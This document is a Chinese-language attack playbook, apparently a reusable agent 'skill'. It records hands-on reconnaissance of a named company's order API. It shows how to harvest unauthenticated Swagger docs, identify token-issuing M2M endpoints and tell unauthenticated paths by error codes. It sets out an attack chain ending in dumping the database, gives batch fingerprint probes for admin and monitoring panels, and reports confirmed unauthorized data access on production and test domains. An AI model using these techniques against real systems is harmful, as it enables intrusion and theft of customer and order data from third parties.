# Spring Boot 中台 API:Swagger 未授权暴露 + M2M 签名族 + 鉴权门判别

来源:huitun(抖音电商 SaaS)订单中台 `orderapi.huitun.com`,2026-09 实测。
方法可直接复用到任何 **Spring Boot + springfox(Swagger 2.0)** 的中国 SaaS 中台。

---

## 1. 命中信号

- `GET /swagger-ui.html` → 200,含 `<title>Swagger UI</title>` / `HTML for static distribution bundle build`
- `Server: volcclb` 等 LB 头、`Transfer-Encoding: chunked`
- `/v2/api-docs` 单打 **404** —— 这是最常见的误判点,多分组时必须带 `group`

## 2. 三步取文档(不要直接打 /v2/api-docs)

```
GET /swagger-ui.html                          # 只证明 UI 在,不含接口定义
GET /swagger-resources                        # ★ 真入口:返回分组清单
# → [{"name":"内部/外部调用","url":"/v2/api-docs?group=内部/外部调用"},
#    {"name":"普通接口","url":"/v2/api-docs?group=普通接口"}]
GET /v2/api-docs                              # ✗ 404(缺 group)
GET /v2/api-docs?group=<urlencode(组名)>       # ✓ 每组一份独立 JSON
GET /swagger-resources/configuration/ui       # 200 ⇒ 确认 springfox/Swagger2.0
```

```python
u = urllib.parse.quote(g["url"].replace(" ", "%20"), safe="/?=&")
```

要点:
- 组名常是**中文**,必须 URL 编码后请求;落盘用 `encoding="utf-8"`。
- 是 Swagger **2.0**(springfox)时对应 `/v2/api-docs`;别只试 `/v3/api-docs`(OpenAPI3)。
- **遍历全部 group**:业务接口多在「普通接口」,未授权 M2M 面多在「内部/外部调用」。
- 实测规模参考:2 组 = 98 + 244 = **342 个接口**,单组文档 603KB ⇒ 值得完整拉。

## 3. ★ 文档 JSON 解析失败时的兜底(高频,不要放弃)

swagger 生成器常见 bug,`json.loads` 抛
`Expecting property name enclosed in double quotes: line 1 column 126665`:

```
"example":['https://detail.1688.com/offer/73904'      ← 单引号被写进 JSON 数组
```

**不要修 JSON,也不要放弃 —— 正文本身就够用:**

```python
# ① 先落盘再解析:异常不丢数据
open("/root/t/grp0.json", "w", encoding="utf-8").write(body)   # 放在 json.loads 之前

# ② 正则抠全量路径 + 方法
re.finditer(r'"(/[^"]{1,90})":\{"(get|post|put|delete)"', raw)

# ③ 抠单个接口的原始定义
i = raw.find('"/auth/token_create":{');  print(raw[i:i+750])

# ④ 抠请求体结构体定义
i = raw.find('"InternalCommonParamV2":{"type"');  print(raw[i:i+1100])
```

参数名 / `required` / body `$ref` / `security` 全在这段原文里,**不需要合法 JSON**。

## 4. 从文档里抠什么(按价值排序)

1. **`security`** —— 例 `[{"X-Session-Token":["global"]}]`,头名 = 会话令牌名
2. **`parameters`** —— name / `in`(query|body) / required / type / format
3. **body 的 `$ref`** → `definitions/<Type>` 公共参数结构体
4. **`tags` 全清单** = 控制器架构(内部/外部/远程服务调用/售后/异常订单…)
5. **summary 业务语义** —— 先挑 `token_create*` / `refresh_token` / `callback` / `get_*_by_*`

## 5. M2M(机器对机器)层的识别特征

出现任一条即**单列为主攻面**,不要混在业务接口里测:

- 路径前缀 `/auth/`、`/out/`、`/external/`、`/internal/`、`/open/`
- 公共参数结构体形如 `{appId, outShopCode/outUserId, sign, timestamp}`
  ⇒ **签名 + 时间戳鉴权,不是会话鉴权**
- 家族含 `token_create` / `token_create_by_shop_id` / `token_create_mobile` / `refresh_token`
  ⇒ **签发凭据的接口 = 全链路最高价值目标**
- 实测对照:`GET /shop/is_have_order?shopId=1&orderId=1` **零凭据**返回
  `{"success":true,"code":0,"data":false}` —— 而该路径**不在文档里**
  ⇒ **应用存在文档外未授权路径,Swagger ≠ 全集,文档与实测枚举要取并集。**

## 6. ★★ 鉴权门判别:只看 HTTP 码会误判

**本技能作者先提出、又被自己实测推翻的推断**:「Spring 的 405 由路由层产生、
拦截器不跑 ⇒ 405 的接口未鉴权」。实测:32 个 405 接口全部 POST →
**全部返回应用自己的鉴权码**。结论废弃。

**正确判据 = 应用自己的错误码,不是 HTTP 码:**

| 响应 | 含义 |
|------|------|
| `{"success":false,"code":2048,"message":"登录状态已失效"}` | ★**鉴权门** —— 拿它当"已拦"的地面真值 |
| `400 Bad Request` | ★参数解析失败。`@RequestParam(required=true)` 校验**晚于**拦截器 `preHandle` ⇒ 能出 400 说明**该路径上没跑鉴权拦截器**,优先深挖 |
| `405 Method Not Allowed` | 只说"该 method 没映射",**推不出任何鉴权结论** |
| `Allow: GET,HEAD,OPTIONS` | ★OPTIONS 响应头直接读出映射的方法集,省掉逐个 method 猜 |

```bash
curl -sS -i -X OPTIONS https://target/auth/token_create   # 读 Allow:
```

**标准动作**:① `OPTIONS -i` 定方法 → ② 用**正确方法 + 文档给的真实参数名**打一发 →
③ 看回来的是 `2048`(已拦)还是业务/参数错误(未拦)。
**同一族里"出 400 而不出 2048"的路径,就是突破口。**

## 7. 平台化脱库的攻击链模板

```
Swagger 未授权
  → 文档给出 token_create* 家族 + 精确参数名 + security 头名
  → 用 Allow 给的正确 method + 真实参数打 token 签发接口
  → 得 token → 打 getSupplierList / 订单族 → 脱库
失败分支:M2M 走 sign 签名
  → 从文档抠 appId/appSecret 字段名 → 前端 JS chunk 里找签名实现
```

## 8. 同类站点批量指纹(一个脚本扫全部域名)

```python
R(u, "/assets/js/backend/index.js")                              # FastAdmin(TP5) 特征
R(u, "/index.php/api/ems/send", "email=<EMAIL-REDACTED>&event=register")  # FastAdmin 未授权 Ems(账号存在性 oracle)
R(u, "/swagger-ui.html"); R(u, "/swagger-resources")             # springfox
R(u, "/v3/api-docs"); R(u, "/actuator/env"); R(u, "/actuator/health")
R(u, "/druid/index.html")                                        # Druid 监控台(中台常见)
```

- 判据:**返回长度若等于该站 404 页长度 ⇒ 该框架不存在**。别把 404 页当命中
  (实测同一族里 `assets/js/backend/index.js` 返 3030 = 该站 404 页长 ⇒ 非 FastAdmin)。
- **测试环境域名单独扫**(`dytest.<domain>` 等):常开 swagger/actuator,鉴权配置与生产不一致。
  实测 `dytest.huitun.com/work/search?keyword=1` 真出业务数据(未授权)。

## 9. Pitfalls

- `/v2/api-docs` 404 ≠ 没有文档,多分组时必须带 `group`。
- 文档里的 `security` 字段**可能只是 Swagger 装饰** —— 本案例该族实测出 400 而非 2048。
  ⇒ **必须实测,不能凭文档下鉴权结论。**
- 不要因 405 就写"未鉴权";25+ 接口一次 POST 全验证,成本极低。
- Swagger JSON 有生成器 bug 是常态:先落盘再解析,正则兜底。
- 中文组名/中文 summary:请求全走 `urllib.parse.quote`,读写全用 utf-8。
